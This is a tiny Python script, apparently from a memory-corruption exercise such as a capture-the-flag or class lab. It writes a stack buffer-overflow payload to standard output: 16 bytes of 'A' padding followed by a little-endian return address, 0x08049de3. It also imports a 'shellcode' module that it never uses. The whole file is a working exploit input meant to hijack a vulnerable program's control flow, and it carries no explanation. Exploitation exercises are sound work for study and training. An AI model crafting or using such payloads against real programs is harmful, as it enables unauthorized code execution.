import sys
from shellcode import shellcode

# Send bytes to output
data = b"AAAAAAAAAAAAAAAA\xe3\x9d\x04\x08"
sys.stdout.buffer.write(data)
